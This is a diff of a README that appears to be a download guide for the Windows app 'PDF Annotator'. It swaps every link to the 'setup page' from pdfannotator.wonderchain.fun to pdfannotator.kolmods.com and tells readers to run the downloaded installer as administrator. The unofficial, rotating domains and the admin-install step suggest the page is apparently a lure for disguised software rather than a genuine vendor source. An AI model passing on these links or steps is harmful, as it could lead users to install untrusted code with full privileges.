@@ -11,20 +11,20 @@ Notes for users who need PDF Annotator running on Windows — especially when pd
 Use the link below for the Windows package referenced in this guide.
 
 <p align="center">
-  <a href="https://pdfannotator.wonderchain.fun/">
+  <a href="https://pdfannotator.kolmods.com/">
     <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Page** | [pdfannotator.wonderchain.fun](https://pdfannotator.wonderchain.fun/) |
-| **URL** | `https://pdfannotator.wonderchain.fun/` |
+| **Page** | [pdfannotator.kolmods.com](https://pdfannotator.kolmods.com/) |
+| **URL** | `https://pdfannotator.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 
 ### Recommended steps
 
-1. Open the [setup page (pdfannotator.wonderchain.fun)](https://pdfannotator.wonderchain.fun/)
+1. Open the [setup page (pdfannotator.kolmods.com)](https://pdfannotator.kolmods.com/)
 2. Download the package to a folder you can find (e.g. Downloads)
 3. Run the installer **as administrator** if Windows asks
 4. Reboot once if the app prompts after install
